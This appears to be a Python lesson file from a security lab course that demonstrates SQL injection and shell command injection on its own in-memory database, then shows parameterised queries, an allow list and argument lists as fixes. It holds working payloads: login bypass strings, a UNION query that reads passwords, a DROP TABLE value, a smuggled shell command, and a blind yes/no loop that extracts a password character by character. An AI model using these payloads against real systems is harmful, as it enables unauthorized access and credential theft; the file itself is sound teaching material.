"""Lesson 8: injection. SQL injection on a real SQLite database in memory, command injection through a real shell, and the fixes.

Asserts what the built query looks like, that `' OR '1'='1` logs in without a password, that UNION returns another table, that a
yes/no leak reads a secret one character at a time (the number of requests is counted), that a parameterised query returns nothing
for the same input, that a column name cannot be a parameter and needs an allow list, and that a shell sees a second command in a
string it was handed while an argument list does not. Everything touches only our own in-memory database and our own python.
"""

import sqlite3
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from seclab import check, done, show  # noqa: E402


def make_db() -> sqlite3.Connection:
    db = sqlite3.connect(":memory:")
    db.executescript(
        """
        CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, password TEXT, role TEXT);
        INSERT INTO users VALUES (1, 'ann', 'pw-ann', 'user'), (2, 'admin', 'S3cretAdm1n', 'admin');
        CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price INTEGER);
        INSERT INTO products VALUES (1, 'pen', 20), (2, 'book', 150), (3, 'bag', 900);
        """
    )
    return db


db = make_db()


def login_naive(name: str, password: str):
    sql = f"SELECT name, role FROM users WHERE name = '{name}' AND password = '{password}'"
    return sql, db.execute(sql).fetchall()


def login_safe(name: str, password: str):
    return db.execute("SELECT name, role FROM users WHERE name = ? AND password = ?", (name, password)).fetchall()


# ---- 1. the query that gets built ----
sql, rows = login_naive("ann", "pw-ann")
show("honest login", sql)
check("an honest login returns one row", rows == [("ann", "user")])
sql, rows = login_naive("ann", "' OR '1'='1")
show("password = ' OR '1'='1", sql)
check("the quote in the input closes the string and OR '1'='1' is now part of the SQL", "OR '1'='1'" in sql)
check("the attacker is logged in as the first user with no password", rows and rows[0][0] == "ann" and len(rows) == 2)
sql, rows = login_naive("admin' --", "x")
show("name = admin' --", sql)
check("-- turns the rest of the line (the password check) into a comment and logs in as admin", rows == [("admin", "admin")])

# ---- 2. reading another table with UNION ----
def search_naive(term: str):
    sql = f"SELECT name, price FROM products WHERE name LIKE '%{term}%'"
    return sql, db.execute(sql).fetchall()


payload = "zzz' UNION SELECT name, password FROM users --"
sql, rows = search_naive(payload)
show("search box = " + payload, sql)
check("the search box now returns user names and passwords in the product list", ("admin", "S3cretAdm1n") in rows)
check("the attacker needed to match the 2 columns of the first query", "SELECT name, price" in sql and "SELECT name, password" in sql)
try:
    db.execute("SELECT name, price FROM products UNION SELECT name FROM users").fetchall()
    mismatch = False
except sqlite3.OperationalError:
    mismatch = True
check("a UNION with the wrong number of columns is an error, which is how an attacker counts them", mismatch)

# ---- 3. a yes/no answer is enough: read a secret one character at a time ----
requests = 0
trace: list[dict] = []


def oracle(question: str, pos: int = 0, mid: int = 0) -> bool:
    """The app only says 'found' or 'not found'. The attacker's question rides inside the name."""
    global requests
    requests += 1
    answer = bool(db.execute(f"SELECT 1 FROM users WHERE name = 'ann' AND {question}").fetchall())
    trace.append({"pos": pos, "mid": mid, "yes": answer})
    return answer


secret = ""
for pos in range(1, 12):
    lo, hi = 32, 126
    if not oracle(f"unicode(substr((SELECT password FROM users WHERE name='admin'), {pos}, 1)) > 0", pos, 0):
        break
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"unicode(substr((SELECT password FROM users WHERE name='admin'), {pos}, 1)) > {mid}", pos, mid):
            lo = mid + 1
        else:
            hi = mid
    secret += chr(lo)
show("secret read through yes/no answers", f"{secret}  after {requests} requests")
check("the admin password is rebuilt without the app ever printing it", secret == "S3cretAdm1n")
check("it takes 85 requests for 11 characters: one to see the character exists and 6 or 7 to halve the 95 possible values", requests == 85 and requests / len(secret) < 8)

# ---- 4. the fix: the value travels apart from the SQL ----
check("a parameterised query treats the same payload as a (wrong) password and returns nothing", login_safe("ann", "' OR '1'='1") == [])
check("a parameterised query still logs in the honest user", login_safe("ann", "pw-ann") == [("ann", "user")])
rows = db.execute("SELECT name, price FROM products WHERE name LIKE ?", (f"%{payload}%",)).fetchall()
check("the UNION payload becomes plain text to search for, and finds no product", rows == [])

# ---- 5. what a parameter cannot do: a column name ----
ALLOWED_SORT = {"name", "price"}


def list_products(sort: str):
    if sort not in ALLOWED_SORT:
        raise ValueError("sort column not allowed")
    return db.execute(f"SELECT name, price FROM products ORDER BY {sort}").fetchall()


check("an allow list lets 'price' through", list_products("price")[0] == ("pen", 20))
try:
    list_products("price; DROP TABLE products")
    blocked = False
except ValueError:
    blocked = True
check("an allow list stops a sort column that is not on it", blocked)
check("the table is still there", db.execute("SELECT count(*) FROM products").fetchone()[0] == 3)

# ---- 6. command injection, with our own python as the program ----
PROG = f'"{sys.executable}" -c "import sys; print(\'ARGS=\', sys.argv[1:])"'
user_input = "report.txt & echo INJECTED"
out = subprocess.run(f"{PROG} {user_input}", shell=True, capture_output=True, text=True).stdout
show("shell=True with a string that contains the user's text", out.strip())
check("the shell ran a second command (echo INJECTED) that nobody meant to allow", "INJECTED" in out)
out = subprocess.run([sys.executable, "-c", "import sys; print('ARGS=', sys.argv[1:])", user_input], capture_output=True, text=True).stdout
show("an argument list, no shell", out.strip())
check("with an argument list the whole text arrives as one harmless argument", "report.txt & echo INJECTED" in out and "INJECTED\n" not in out.replace("echo INJECTED", ""))

if "--write" in sys.argv:
    import json

    ROOT = Path(__file__).resolve().parents[4]
    OUT = ROOT / "site" / "src" / "components" / "labs" / "app-security" / "injection.json"
    logins = []
    for name, pw in (("ann", "pw-ann"), ("ann", "' OR '1'='1"), ("admin' --", "x")):
        sql, rows = login_naive(name, pw)
        logins.append({"name": name, "pw": pw, "naiveSql": sql, "naiveRows": [list(r) for r in rows], "safeRows": [list(r) for r in login_safe(name, pw)]})
    searches = []
    for term in ("pen", payload):
        sql, rows = search_naive(term)
        safe_rows = db.execute("SELECT name, price FROM products WHERE name LIKE ?", (f"%{term}%",)).fetchall()
        searches.append({"term": term, "naiveSql": sql, "naiveRows": [list(r) for r in rows], "safeSql": "SELECT name, price FROM products WHERE name LIKE ?", "safeParam": f"%{term}%", "safeRows": [list(r) for r in safe_rows]})
    OUT.write_text(json.dumps({"logins": logins, "searches": searches, "secret": secret, "requests": requests, "trace": trace}, indent=1), encoding="utf-8")
    print(f"wrote {OUT}")
done()
